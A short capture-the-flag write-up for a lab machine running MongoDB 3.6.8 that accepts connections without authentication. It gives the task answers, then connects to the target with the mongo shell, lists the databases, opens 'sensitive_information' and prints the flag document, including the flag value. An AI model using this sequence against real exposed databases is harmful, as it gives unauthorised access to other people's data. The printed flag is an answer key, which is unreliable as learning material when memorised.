# MONGOD

## Task 01

There is 2 port running on this machine.

## Task 02

The service running on the port 27017 is `MongoDB 3.6.8`

## Task 03

This is a `Nosql` type database.

## Task 04

The mongodb command is `mongo`.

## Task 05

The mongo db command to show all database present on the db server is `show dbs`

## Task 06

The command to list the collections is `show collections`.

## Task 07
What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read? `db.flag.find().pretty()`.

## Root Flag

We'll try to connect with:

```bash
mongo [ip of the target]
```

Then once we are connect! <br/>

I try a:
```bash
show dbs
```

Got:

```bash
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
```

I tried to visit `admin`, `user` for nothing! Then I tried `sensitive_information` with:

```bash
use sensitive_information
```

Then

```bash
show collections
```

Can see a flag document so i decided to use the command we find before.

```bash
db.flag.find().pretty()
```

And after this we got this ->

```bash
{
        "_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
        "flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
```
Here it is.